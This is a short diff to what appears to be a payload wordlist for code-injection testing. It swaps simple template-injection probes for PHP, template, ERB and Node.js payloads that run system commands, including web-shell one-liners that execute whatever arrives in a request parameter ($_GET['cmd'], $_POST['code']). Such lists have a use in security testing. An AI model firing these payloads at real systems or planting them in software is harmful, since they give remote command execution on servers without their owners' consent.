@@ -1,6 +1,10 @@
 <?php system('id'); ?>
-<% Runtime.getRuntime().exec('id'); %>
-#{7*7}
-${7*7}
-{{7*7}}
-@{7*7}
+<?php passthru($_GET['cmd']); ?>
+<?php eval($_POST['code']); ?>
+<%=`id`%>
+{{system('id')}}
+${@system('id')}
+\n<?php system('id'); ?>
+; <?php system('id'); ?>
+<% exec('id') %>
+<script>require('child_process').execSync('id')</script>
